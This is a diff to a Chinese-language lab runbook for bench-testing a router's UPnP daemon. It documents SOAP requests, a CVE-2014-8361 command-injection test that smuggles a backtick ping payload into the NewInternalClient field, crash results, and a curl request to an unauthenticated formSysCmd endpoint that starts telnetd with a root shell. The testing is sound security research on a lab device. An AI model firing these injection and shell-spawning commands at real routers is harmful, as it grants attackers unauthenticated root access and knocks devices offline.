@@ -3615,18 +3615,99 @@ sudo nmap -sT -p 5555,7547 10.1.1.1
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
-| T3 | **會建立一個埠映射，而這一節負責把它刪掉** | [`RUNBOOK` §8.12.29](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+| T3 | **每一發不合它意的請求都會終止 `miniigd`，而那要斷電才回得來** | [`RUNBOOK` §8.12.29](RUNBOOK.md) | 2026-08-19（三發，燒掉三次斷電） |
 
 ```bash
 python3 tools/bench-probe.py ssdp --host 10.1.1.1 -o dumps/w07-ssdp.json
+python3 tools/upnp-soap.py --host 10.1.1.1 --describe
 ```
 
-> 🔴 **SOAP 的路徑是 `/upnp/control/WANIPConnection`，不是手冊寫的 `WANIPConn1`。**
-> 錯的路徑會讓一整輪回 404，看起來像「這台沒有 UPnP」——而 `P1-10` 已經量到 52869 是開的。
-> **一個錯的路徑產生的是一個假的否定。**
+> 🔴 **控制路徑不要用打的。** `/upnp/control/WANIPConn1` 是 `miniupnpd` 的；
+> 這顆 binary 答的是 `/upnp/control/WANIPConnection`。錯的路徑回一個乾淨的 404，
+> 看起來像「這台沒有 UPnP 控制面」——**而埠從頭到尾都是開的**。
+> `upnp-soap.py` 從裝置自己的描述文件讀它，讀不到就拒絕，不猜。
 
-`AddPortMapping` 的四個欄位帶 shell 字元（`P6-1`，CVE-2014-8361），
-`NewInternalClient` 填 `10.1.1.1`（`P8-7`）。**做完必須把映射刪掉，而且在同一節裡完成。**
+**正對照先跑，因為後面每一發都可能是最後一發：**
+
+```bash
+python3 tools/upnp-soap.py --host 10.1.1.1 --action GetExternalIPAddress
+```
+
+```text
+  -> HTTP 200
+  <- NewExternalIPAddress = 127.0.0.1
+```
+
+**`P8-7`——`NewInternalClient` 會不會被驗證等於請求來源：**
+
+```bash
+python3 tools/upnp-soap.py --host 10.1.1.1 --action AddPortMapping \
+  --arg NewRemoteHost= --arg NewExternalPort=8080 --arg NewProtocol=TCP \
+  --arg NewInternalPort=80 --arg NewInternalClient=10.1.1.1 \
+  --arg NewEnabled=1 --arg NewPortMappingDescription=w07 --arg NewLeaseDuration=0
+python3 tools/upnp-soap.py --host 10.1.1.1 \
+  --action GetGenericPortMappingEntry --arg NewPortMappingIndex=0
+```
+
+```text
+  -> HTTP 200
+  <- NewInternalClient = 10.1.1.1        ← 原樣，沒有被改寫成 10.1.1.100
+  <- NewPortMappingDescription = miniupnpd   ← 送出去的值沒有被存
+```
+
+**`P6-1`——CVE-2014-8361。payload 從檔案讀，指令列上不准出現反引號：**
+
+```bash
+printf '%s\n' '`ping -c 4 10.1.1.100`' > /tmp/p61.txt
+python3 tools/upnp-soap.py --host 10.1.1.1 --action AddPortMapping \
+  --arg NewRemoteHost= --arg NewExternalPort=8082 --arg NewProtocol=TCP \
+  --arg NewInternalPort=82 --arg NewInternalClient=PLACEHOLDER \
+  --arg NewEnabled=1 --arg NewPortMappingDescription=w07c --arg NewLeaseDuration=0 \
+  --arg-file NewInternalClient=/tmp/p61.txt --inject
+```
+
+> 🔴 **把 payload 打在指令列上會被你自己的 shell 吃掉，而且是靜默的。**
+> 2026-08-19 第一發就是這樣沒的：打算送 25 bytes 的反引號 payload，
+> **本機 shell 先把它展開了**，實際送出去的是本機 `ping` 的 stdout，431 bytes、8 個換行。
+> `miniigd` 當場死掉，那一發什麼都沒測到。`--arg-file` 就是為了這個而存在，
+> 而**不給 `--inject` 它會拒絕**——一次良性基準和一次注入必須是兩條不同的命令。
+
+> 🔴 **開火之前先想好它會不會回不來。** 2026-08-19 量到的是：
+> **任何 `inet_addr()` 不接受的 `NewInternalClient` 都會終止 `miniigd`**，
+> 不是只有帶元字元的。對照組是 22 個 `A`，一個元字元都沒有，殺得一樣快；
+> 而 `NewInternalClient=10.1.1.1` 這一發它活著。**每死一次就是一次斷電重開。**
+
+**判「死掉」還是「還活著但不聽」——這兩個 `connection refused` 長得一模一樣：**
+
+```bash
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+  --data-urlencode 'sysCmd=telnetd -l /bin/sh &' --data 'submit-url=/syscmd.htm'
+```
+
+進 telnet 之後 `ps | grep -c miniigd`。2026-08-19 得到 `0`——**行程不存在**，
+與 `P6-3` 的 `wscd`（行程還在、只是關掉 listener）是不同的失敗模式。
+⚠️ 那是一個沒有認證的 root shell，收工前必須斷電。
+
+**映射進到哪裡去了，同一個 shell 裡看：**
+
+```bash
+iptables -t nat -L -n
+```
+
+```text
+Chain MINIUPNPD (0 references)
+DNAT  tcp -- 0.0.0.0/0  0.0.0.0/0  tcp dpt:8083 to:255.255.255.255:83
+```
+
+> ⚠️ **`255.255.255.255` 是 `inet_addr()` 失敗回的 `INADDR_NONE`，而程式照用。**
+> 值完全沒有被驗證，一路進到防火牆規則。
+> 而 **`(0 references)` 不能單獨讀成「映射不通」**：那一場 WAN 線沒接、
+> `ip_forward` 是 `0`，所以那與「沒有 WAN 所以不轉送」完全相容。
+> **`P8-7` 的後半要線在 WAN 埠才判得了。**
+
+**做完把映射刪掉，而且在同一節裡完成**（`--action DeletePortMapping`）。
+2026-08-19 沒有做到：daemon 死了就沒有辦法對它送 `DeletePortMapping`，
+兩條映射是**被斷電清掉的**，而那個區別要照實寫進紀錄卡。
 
 ---
 
